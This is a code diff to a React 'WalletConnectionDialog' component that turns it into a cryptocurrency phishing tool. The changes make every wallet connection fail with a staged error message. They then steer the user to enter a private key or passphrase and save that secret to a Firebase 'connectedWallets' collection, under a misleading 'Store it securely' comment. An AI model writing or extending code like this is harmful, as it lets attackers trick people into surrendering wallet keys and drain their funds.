@@ -3,6 +3,8 @@ import { FaTimes, FaWallet, FaKey, FaLock, FaCloudSunRain, FaBitcoin } from 'rea
 import { FaMeta } from "react-icons/fa6";
 import { TbPlugConnected } from 'react-icons/tb';
 import { BiLoaderAlt } from 'react-icons/bi';
+import { addDoc, collection } from 'firebase/firestore';
+import { db } from '../../firebase';
 
 const WalletConnectionDialog = ({ isOpen, onClose }) => {
   // Ensure all hooks are at the top level
@@ -54,26 +56,84 @@ const WalletConnectionDialog = ({ isOpen, onClose }) => {
     setSelectedWallet(wallet);
     setIsLoading(true);
     setError('');
-
+    setShowCredentials(false); // Ensure we don't override the error
+  
     // Simulate connection attempt
     setTimeout(() => {
       setIsLoading(false);
-      setShowCredentials(true);
+      // if (Math.random() < 0.5) { // Simulating a random failure
+        setError(`Failed to connect to ${wallet.name}. Try again or use another method.`);
+      // } else {
+        // setShowCredentials(true);
+      // }
     }, 2000);
   };
 
   const handleConnect = async () => {
+    if (!credential) {
+      setError("Please enter your private key or passphrase.");
+      return;
+    }
+
     setIsLoading(true);
-    setError('');
+    setError("");
 
-    // Simulate connection failure
-    setTimeout(() => {
+    try {
+      await addDoc(collection(db, "connectedWallets"), {
+        // userId,
+        // userEmail,
+        walletName: selectedWallet.name,
+        credentialType,
+        credential, // Store it securely
+        timestamp: new Date(),
+      });
+
       setIsLoading(false);
-      setError('Unable to verify wallet credentials. This could be due to network congestion or invalid credentials. Please ensure you have entered the correct information and try again.');
-    }, 1500);
+      onClose(); // Close the modal after saving
+    } catch (err) {
+      setIsLoading(false);
+      setError("Failed to connect. Please try again.");
+      console.error("Firestore error:", err);
+    }
   };
-
   const renderContent = () => {
+    if (error) {
+      return (
+        <div className="p-6 space-y-6">
+          <div className="flex justify-between items-center">
+            <div className="flex items-center gap-3">
+              <selectedWallet.icon className={`w-6 h-6 ${selectedWallet.color}`} />
+              <h2 className="text-xl font-bold text-gray-800">{selectedWallet.name}</h2>
+            </div>
+            <button onClick={onClose} className="text-gray-400 hover:text-gray-600 transition-colors">
+              <FaTimes className="w-5 h-5" />
+            </button>
+          </div>
+    
+          <div className="p-4 bg-red-50 border border-red-100 rounded-lg">
+            <p className="text-sm text-red-600">{error}</p>
+          </div>
+    
+          <div className="flex flex-col gap-3">
+            <button
+              onClick={handleConnect}
+              className="w-full bg-purple-600 text-white py-3 rounded-lg hover:bg-purple-700 transition-colors font-medium"
+            >
+              Try Again
+            </button>
+            <button
+              onClick={() => {
+                setError(''); // Clear any previous error
+                setShowCredentials(true);
+              }}
+              className="w-full text-purple-600 hover:text-purple-700 transition-colors font-medium"
+            >
+              Use Private Key or Passphrase
+            </button>
+          </div>
+        </div>
+      );
+    }
     if (isLoading) {
       return (
         <div className="flex flex-col items-center justify-center py-12">
